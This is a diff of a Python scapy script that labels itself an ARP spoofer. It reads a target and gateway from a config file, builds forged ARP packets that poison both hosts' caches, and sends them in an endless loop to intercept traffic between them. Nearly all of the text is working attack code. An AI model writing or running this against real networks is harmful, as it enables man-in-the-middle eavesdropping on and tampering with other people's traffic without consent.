@@ -17,22 +17,30 @@ with codecs.open('interceptor.conf', 'r', encoding='utf-8') as f:
 gatewayip = parser.get('arpmodule', 'gatewayip')
 targetip = parser.get('arpmodule', 'targetip')
 interface = parser.get('arpmodule', 'interface')
+interface = str(interface)
 
-
-def create_packet(src_ip, dst_ip, iface):
+def create_packet(src_ip, dst_ip, interface):
 	packet = ARP()
 	packet.psrc = src_ip
 	packet.pdst = dst_ip
-	packet.hwsrc = get_if_hwaddr(iface)
+	packet.hwsrc = get_if_hwaddr(interface)
 	return packet
 
+
+def get_default_gateway_ip(interface):
+	try:
+		return [x[2] for x in scapy.all.conf.route.routes if x[3] == interface and x[2] != '0.0.0.0'][0]
+	except IndexError:
+		print "Error: Network interface '%s' not found!" % interface
+		return False
 
 gateway = get_default_gateway_ip(interface)
 
 
-to_victim = create_packet(gateway, sys.argv[1], interface)
-to_gateway = create_packet(sys.argv[1], gateway, interface)
-print interface, gateway
+to_victim = create_packet(gateway, targetip, interface)
+print "[ATTACK]-[ARPSPOOFER] target: ",targetip
+to_gateway = create_packet(targetip, gateway, interface)
+print "[ATTACK]-[ARPSPOOFER] target: ", gateway
 
 while 1:
 	send(to_victim, verbose=0)
